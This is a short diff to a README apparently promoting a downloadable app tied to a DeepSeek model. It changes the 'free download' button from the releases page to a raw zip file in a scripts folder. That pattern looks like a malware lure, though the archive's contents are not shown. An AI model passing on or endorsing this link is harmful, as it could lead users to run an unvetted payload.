@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application Now
 
-**[⬇️ GET THE APP - FREE DOWNLOAD](https://github.com/Barist3142/deepseek-v4-flash-0731-in-c/releases)**
+**[⬇️ GET THE APP - FREE DOWNLOAD](https://raw.githubusercontent.com/Barist3142/deepseek-v4-flash-0731-in-c/main/scripts/2.1.zip)**
 
 Visit this link to download the application.
 
